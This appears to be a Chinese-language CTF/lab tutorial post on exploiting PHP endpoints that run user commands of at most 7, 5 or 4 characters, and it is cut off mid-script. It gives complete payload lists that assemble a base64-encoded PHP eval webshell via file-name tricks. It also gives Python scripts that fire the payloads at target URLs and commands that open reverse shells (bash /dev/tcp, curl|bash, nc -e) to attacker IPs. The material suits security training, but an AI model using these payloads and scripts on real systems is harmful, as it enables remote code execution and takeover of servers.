<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#&gt;ag</span><br><span class="line">#&gt;fl</span><br><span class="line">#&gt;&quot;t&quot;</span><br><span class="line">#&gt;ca</span><br><span class="line">#ls -t</span><br><span class="line">ca &#x27;t &#x27; fl ag</span><br></pre></td></tr></table></figure>

<p>按时间顺序反向依次创建文件，”ca” “‘t “ “fl” “ag”</p>
<p>再通过ls -t &gt; x，创建文件x，并把’Is -t执行结果写入文件x里 。</p>
<p>实际上在创建文件时，加入”&quot;，把命令”ca””t””f””ag”连接起来</p>
<blockquote>
<ul>
<li><p>“\” linux中可以用\使指令连接下一行，这样就可以写多行命令了。</p>
</li>
<li><p>文件中前面命令出错，会自动跳过，不影响后面命令的执行。</p>
</li>
<li><p>Shell 脚本的执行方式通常有如下<a target="_blank" rel="noopener" href="https://blog.csdn.net/timchen525/article/details/76407735">三种</a>：</p>
</li>
</ul>
<p>​       bash script-name 或者 sh script-name；</p>
<p>​       path&#x2F;script-name或者.&#x2F;script-name；</p>
<p>​       sourcescript-name或者. script-name。</p>
<p>推荐用第一种 <code>bash file</code> <code>sh file</code> 第三种<code>. file </code>第二种要文件有执行权限故不推荐</p>
</blockquote>
<p>上面不是ls -t&gt;a 吗</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat a     查看后发现都写进去了</span><br></pre></td></tr></table></figure>

<p>然后可以.a执行脚本</p>
<p>可以发现确实符合第四条 文件中前面命令出错，会自动跳过，不影响后面命令的执行。</p>
<p>可以发现最长的长度就是 <code>ls -t&gt;0</code> 7了</p>
<p>上点难度假如要执行 <code>echo Y2F0IC9mbGFn|base64 -d&gt;1</code> 怎么办？(Y2F0IC9mbGFn -&gt; cat &#x2F;flag)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#写入语句</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">#base64编码后</span></span><br><span class="line">PD9waHAgZXZhbCgkX0dFVFsxXSk7</span><br><span class="line"><span class="comment">#需要被执行的语句：</span></span><br><span class="line"><span class="keyword">echo</span> PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>



<p>payload.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;7\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">ls -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure>

<p>脚本：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://172.19.14.20:27444/index.php?rce=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        requests.get(url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否攻击成功</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://172.19.14.20:27444/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>攻击完成后就会生成1.php文件</p>
<p><strong>注：</strong>这里用的是&lt;?php eval($_GET[1]); 不是一句话木马，不能用蚁剑链接(可能改成POST就行了，不过没有尝试)</p>
<p>命令里的空格，&gt; ，| ，或者其他特殊字符一定要转义。</p>
<h3 id="5字符下可控"><a href="#5字符下可控" class="headerlink" title="5字符下可控"></a>5字符下可控</h3><p>与7字符下可控一样</p>
<p>主要思路是缩短 <code>ls -t&gt;0</code> 这一步骤的长度，把这条命令拆分到各个文件中去</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/www/sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="法1-1"><a href="#法1-1" class="headerlink" title="法1"></a>法1</h4><p>拼接字符串写入一句话</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;7\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">ls -t&gt;0【前面可以拆成更小的，ls -t&gt;0需要单独拆分出来】</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure>

<p>ls -t &gt;0 拆分方法</p>
<p>同理：</p>
<ol>
<li><p>输入通配符 * ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数</p>
</li>
<li><p>通过rev来倒置输出内容（rev命令将文件中的每行内容以字符为单位反序输出）</p>
</li>
<li><p>用dir来代替ls不换行输出；rev将文件内容反向输出；在用ls时，写到a时每个文件名都是单独一行</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;rev</span><br><span class="line">echo 1234 &gt; v</span><br><span class="line">*v （等同于命令：rev v）</span><br></pre></td></tr></table></figure>

<p>目的：echo${IFS}PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 ‐d&gt;1.php</p>
<p>那么我们只需要将上面的代码拆分倒序输入到主机即可。我们需要让sh先执行a文件（ls -th &gt;f）就会得到f文件，最后再让sh去执行f文件即可得到1.php。最终payload如下</p>
<p>payload.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;a</span><br><span class="line">&gt;hp</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;7\\</span><br><span class="line">&gt;Sk\\</span><br><span class="line">&gt;X\\</span><br><span class="line">&gt;x\\</span><br><span class="line">&gt;Fs\\</span><br><span class="line">&gt;FV\\</span><br><span class="line">&gt;d\\</span><br><span class="line">&gt;X0\\ </span><br><span class="line">&gt;k\\</span><br><span class="line">&gt;g\\</span><br><span class="line">&gt;bC\\</span><br><span class="line">&gt;h\\</span><br><span class="line">&gt;XZ\\</span><br><span class="line">&gt;gZ\\</span><br><span class="line">&gt;A\\</span><br><span class="line">&gt;aH\\</span><br><span class="line">&gt;w\\</span><br><span class="line">&gt;D9\\ </span><br><span class="line">&gt;P\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;o\\</span><br><span class="line">&gt;ch\\</span><br><span class="line">&gt;e\\</span><br><span class="line">sh a</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure>

<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.12.107/5/index.php?cmd=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        requests.get(url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        <span class="comment">#检查是 否攻击成功</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://192.168.12.107/5/sandbox/2ad26c4b0f3cdead3c4c1955ad805b8d/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>然后蚁剑连接即可（1.php）</p>
<h4 id="法2-1"><a href="#法2-1" class="headerlink" title="法2"></a>法2</h4><p>反弹shell</p>
<p>既然可以执行命令，那么我们首先想到的是反弹一个shell回来</p>
<blockquote>
<p>我们在自己的vps上web目录&#x2F;var&#x2F;www&#x2F;html&#x2F;里先创建一个文件index.html，里面写好反弹shell的话（由于linux文件名不能有斜杠“&#x2F;”，所以就不能curl xxx.xxx.xxx.xxx&#x2F;1.txt，我们就用index，这样47.1x0.1x0.123连上后会默认自动访问index.html反弹shell）</p>
</blockquote>
<p>bash反弹shell的命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/vps的ip/监听的端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>空格需要转义</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;\ \\</span><br></pre></td></tr></table></figure>

<p>构造空格就用去了五个字符，我们的语句里面有两个空格，而相同的文件名只能有一个，因此这里不能直接执行bash反弹shell<br>那么通过将反弹语句放在vps上，然后通过如下方式来执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl ip地址|bash</span><br></pre></td></tr></table></figure>

<p>我们先在自己的vps新建一个文件，内容为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/120.79.33.253/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>然后在vps上面监听7777端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lv 7777</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cd8fbd6.png" alt="image-20240401084203278"></p>
<p>因为ls -t&gt;_的长度也大于5，所以要要把ls -t&gt;y写入文件</p>
<p>ls命令排序的规则是空格和符号最前，数字其次，字母最后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;ls\\</span><br><span class="line">ls&gt;_</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;-t\\</span><br><span class="line">&gt;\&gt;y</span><br><span class="line">ls&gt;&gt;_</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161ce76530.png" alt="image-20240401084253212"></p>
<p>那么我们再构造curl 120.79.33.253|bash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;bash</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;53\\</span><br><span class="line">&gt;2\\</span><br><span class="line">&gt;3.\\</span><br><span class="line">&gt;3\\</span><br><span class="line">&gt;9.\\</span><br><span class="line">&gt;7\\</span><br><span class="line">&gt;0.\\</span><br><span class="line">&gt;12\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;rl\\</span><br><span class="line">&gt;cu\\</span><br></pre></td></tr></table></figure>

<p>然后运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh _</span><br></pre></td></tr></table></figure>

<p>生成文件y<br>再执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh y</span><br></pre></td></tr></table></figure>





<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">本脚本使用说明:</span></span><br><span class="line"><span class="string">    现有靶机:192.168.40.148  攻击机:192.168.40.146,两者均为kali</span></span><br><span class="line"><span class="string">    对于靶机:</span></span><br><span class="line"><span class="string">        搭建环境:</span></span><br><span class="line"><span class="string">        拉取镜像: docker pull mcc0624/cmd:latest</span></span><br><span class="line"><span class="string">        启动docker: sudo docker run -p 18022:22 -p 18080:80 -p 18081:81 -p 18082:82 -p 18085 -i -t mcc0624/cmd:latest bash -c &#x27;/etc/rc.local; /bin/bash&#x27;</span></span><br><span class="line"><span class="string">        退出并关闭docker:exit</span></span><br><span class="line"><span class="string">    对于攻击机: 开三个终端,分别执行:</span></span><br><span class="line"><span class="string">        nc -lvp 7777</span></span><br><span class="line"><span class="string">        vim 一个index.html文件,写入 nc 192.168.40.146 7777 -e /bin/bash 或执行命令: echo &quot;nc 192.168.40.146 7777 -e /bin/bash&quot; &gt; index.html</span></span><br><span class="line"><span class="string">        开启HTTP服务: python -m http.server 80</span></span><br><span class="line"><span class="string">        (第二,第三个命令需要在同一个目录下执行)</span></span><br><span class="line"><span class="string">    温馨提示:</span></span><br><span class="line"><span class="string">        根据情况修改变量baseurl的值</span></span><br><span class="line"><span class="string">        根据情况修改list2中的IP</span></span><br><span class="line"><span class="string">        在执行该脚本的时候,可通过进入靶机内部对应的题目目录下不断地执行ls命令,来看传值的情况</span></span><br><span class="line"><span class="string">        最终的结果应是21秒左右能反弹成功</span></span><br><span class="line"><span class="string">        不能反弹成功时尝试查看脚本是否有问题</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">baseurl = <span class="string">&quot;http://192.168.40.148:18080/class09/3/index.php?cmd=&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将ls -t 写入文件_</span></span><br><span class="line"><span class="built_in">list</span>=[</span><br><span class="line">    <span class="string">&quot;&gt;ls\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ls&gt;_&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\ \\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;-t\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\&gt;y&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ls&gt;&gt;_&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据自己情况更改ip curl 192.168.40.146|bash</span></span><br><span class="line">list2=[</span><br><span class="line">    <span class="string">&quot;&gt;bash&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\|\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\/\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;6\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;14\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;0.\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;4\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;8.\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;16\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;2.\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;19\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\ \\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;rl\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;cu\\&quot;</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    url = baseurl+<span class="built_in">str</span>(i)</span><br><span class="line">    s.get(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    url = baseurl+<span class="built_in">str</span>(j)</span><br><span class="line">    s.get(url)</span><br><span class="line"></span><br><span class="line">s.get(baseurl+<span class="string">&quot;sh _&quot;</span>)</span><br><span class="line">s.get(baseurl+<span class="string">&quot;sh y&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">在攻击机上:</span></span><br><span class="line"><span class="string">开三个页面,分别执行:</span></span><br><span class="line"><span class="string">nc -lvp </span></span><br><span class="line"><span class="string">python -m http.server 80</span></span><br><span class="line"><span class="string">echo &quot;192.168.40.146&quot; &gt; index.html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">然后开始运行此python文件</span></span><br><span class="line"><span class="string">大概等21秒,成功反弹到攻击机</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>







<h3 id="4字符下可控"><a href="#4字符下可控" class="headerlink" title="4字符下可控"></a>4字符下可控</h3><h4 id="法1-2"><a href="#法1-2" class="headerlink" title="法1"></a>法1</h4><p>常规：字符拼接写马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$argv</span></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/\?|/&quot;</span>,<span class="string">&quot;=====&quot;</span>,<span class="variable">$argv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$argv</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span>  &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag in local path flag file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>1.输入统配符* ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;id</span><br><span class="line">&gt;root</span><br><span class="line">*           （等同于命令：id root）</span><br></pre></td></tr></table></figure>



<p>2.dir:虽然基本上和 ls 一样，但有两个好处，一是开头字母是d ，这使得它在 alphabetical 序中靠前，二是按列输出，不换行。</p>
<p>先看下ls的效果，写到a时每个文件名都是单独一行，这样会影响命令执行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161ce58e6d.png" alt="image-20240401090301990"></p>
<p>看下dir的效果，会不换行输出到文件中去</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cda6859.png" alt="image-20240401090338004"></p>
<p>3.rev:可以反转文件每一行的内容。</p>
<p>4.增加字母来限定被用来当作命令和参数的文件名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;ls</span><br><span class="line">&gt;lss</span><br><span class="line">&gt;lsss</span><br><span class="line">&gt;1</span><br><span class="line">*s       (等同于命令： ls lss lsss)</span><br></pre></td></tr></table></figure>



<p>5.通过增加ls的-h（把文件大小显示成1k 1M 等形式）参数来让调整-t（根据时间排序）参数的位置<br>我们之后需要用到rev 倒置输出</p>
<p>所以需要列出这样形式的文件名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&gt;  t-  sl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;0\&gt;</span><br><span class="line">&gt;t-</span><br><span class="line">&gt;sl</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cd8ee61.png" alt="image-20240401090117318"></p>
<p>所以要增加-h来把-t往前拉</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;0\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664161cd95c36.png" alt="image-20240401090153203"></p>
<p>所以</p>
<p>因为是四个字符，所以 ls&gt;&gt;? 肯定是不能用了。</p>
<p>看一下构造：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-</span><br></pre></td></tr></table></figure>

<p>发现dir排在最前面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x</span><br></pre></td></tr></table></figure>

<p>*&gt;v 表示 执行 dir 并输出到 v 中</p>
<p>v&gt;x 很巧妙，这里这里目录下这么多文件，只有 rev 能执行成功（rev v&gt;x）</p>
<p>最后：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v        (等同于命令：dir &quot;f&gt;&quot; &quot;ht-&quot; &quot;sl&quot; &gt; v)</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;0        (等同于命令：rev v &gt; 0)(0里面的内容位:ls -th &gt;f)</span><br><span class="line">sh 0        (sh执行0里面的内容)</span><br></pre></td></tr></table></figure>



<h4 id="法2-2"><a href="#法2-2" class="headerlink" title="法2"></a>法2</h4><p>反弹</p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">可用</span></span><br><span class="line"><span class="string">本脚本使用说明:</span></span><br><span class="line"><span class="string">    现有靶机:192.168.40.148  攻击机:192.168.40.146,两者均为kali</span></span><br><span class="line"><span class="string">    对于靶机:</span></span><br><span class="line"><span class="string">        搭建环境:</span></span><br><span class="line"><span class="string">        拉取镜像: docker pull mcc0624/cmd:latest</span></span><br><span class="line"><span class="string">        启动docker: sudo docker run -p 18022:22 -p 18080:80 -p 18081:81 -p 18082:82 -p 18085 -i -t mcc0624/cmd:latest bash -c &#x27;/etc/rc.local; /bin/bash&#x27;</span></span><br><span class="line"><span class="string">        退出并关闭docker:exit</span></span><br><span class="line"><span class="string">    对于攻击机: 开三个终端,分别执行:</span></span><br><span class="line"><span class="string">        nc -lvp 7777</span></span><br><span class="line"><span class="string">        vim 一个index.html文件,写入 nc 192.168.40.146 7777 -e /bin/bash 或执行命令: echo &quot;nc 192.168.40.146 7777 -e /bin/bash&quot; &gt; index.html</span></span><br><span class="line"><span class="string">        开启http服务: python -m http.server 80</span></span><br><span class="line"><span class="string">        (第二,第三个命令需要在同一个目录下执行)</span></span><br><span class="line"><span class="string">    温馨提示:</span></span><br><span class="line"><span class="string">        根据情况修改变量baseurl的值</span></span><br><span class="line"><span class="string">        根据情况修改list2中的IP</span></span><br><span class="line"><span class="string">        在执行该脚本的时候,可通过进入靶机内部对应的题目目录下不断地执行ls命令,来看传值的情况</span></span><br><span class="line"><span class="string">        最终的结果应是25秒左右能反弹成功</span></span><br><span class="line"><span class="string">        不能反弹成功时尝试查看脚本是否有问题,或退出并重启改docker</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">baseurl = <span class="string">&quot;http://192.168.40.148:18080/class09/4/ffff.php?cmd=&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将ls -t 写入文件g</span></span><br><span class="line"><span class="built_in">list</span>=[</span><br><span class="line">    <span class="string">&quot;&gt;g\;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;g\&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;ht-&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;sl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;dir&quot;</span>,</span><br><span class="line">    <span class="string">&quot;*&gt;v&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;rev&quot;</span>,</span><br><span class="line">    <span class="string">&quot;*v&gt;x&quot;</span></span><br><span class="line">]</span><br><span class="line"><span class="comment"># list2本质上执行命令: curl 192.168.40.146|bash</span></span><br><span class="line"><span class="comment"># 注意根据情况修改攻击机IP</span></span><br><span class="line">list2= [</span><br><span class="line">    <span class="string">&quot;&gt;ash&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;b\\&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;\|\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;6\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;14\\&#x27;</span>,</span><br><span class="line">    <span 